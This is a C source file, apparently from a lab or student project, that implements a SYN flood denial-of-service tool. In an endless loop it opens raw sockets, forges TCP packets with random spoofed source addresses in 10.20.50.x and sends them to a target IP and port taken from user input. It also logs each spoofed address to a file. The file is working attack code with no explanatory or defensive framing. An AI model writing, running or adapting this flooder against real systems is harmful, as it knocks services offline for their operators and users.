#include "../includes/lib_attack.h"
 
int main(void)
{
    FILE    *file;		//To store created IP numbers.
    FILE    *interfaceFile;//To store interface knowledge.
    int     integerIP = 67;	//To create random source IPs.
    char    stringIP[3];
    int     sourcePort;
    int     count = 0;	//To hold how many IP's are created.
    char    intface[20];	//To hold interface through which attack is happening.
    char    dIP[16];	//To specify which IP and port to attack.
    int     destPort;
    int     s;
    char    datagram[4096], source_ip[32];
    struct  iphdr *iph;
    struct  tcphdr *tcph;
    struct  sockaddr_in sin;
    struct  pseudo_header psh;

    file = fopen("./SYN-Flood/IPNumbersCreated.txt", "w");
    interfaceFile = fopen("./SYN-Flood/interface.conf", "w");
    srand(time(NULL));	//Setting the seed for random creation.
    accept_info(interfaceFile, dIP, &destPort); ///check if dIP is valid!!!!!!!!!!!!!!!!!
   
    while(1)
    {
        s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); //Create a raw socket
        iph = (struct iphdr *)datagram; //IP header
        tcph = (struct tcphdr *)(datagram + sizeof(struct ip)); //TCP header
        integerIP = 1 + (rand() % 254);  //creating random IP numbers.

        memset(datagram, 0, 4096);
        memset(source_ip, 0, 32);
        //Adding created integer to source host address.
        int length = snprintf(NULL, 0, "%d", integerIP);
        char* str = malloc(length + 1);
        snprintf(str, length + 1, "%d", integerIP);
        strcpy(source_ip , "10.20.50.");
        strcat(source_ip,str);
        free(str);
        fill_struct(sin, iph, tcph, psh, destPort, dIP, source_ip, datagram, sourcePort);
        
        //IP_HDRINCL to tell the kernel that headers are included in the packet
        int one = 1;
        const int *val = &one;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
            exit(0);
        }
        
        //Send the packet
        if (sendto (s,                      /* our socket */
                datagram,                   /* the buffer containing headers and data */
                iph->tot_len,               /* total length of our datagram */
                0,                          /* routing flags, normally always 0 */
                (struct sockaddr *) &sin,   /* socket addr, just like in */
                sizeof (sin)) < 0)          /* a normal send() */
        {
            printf ("error\n");
        }
        //Data send successfully
        else
        {
            fprintf (file,"%d. %s\n", count, source_ip);
        }
        close(s);
        count++;
    } 
    printf("Number of IP addresses created: %d\n", count);
    fclose(file); 
    return (0);
}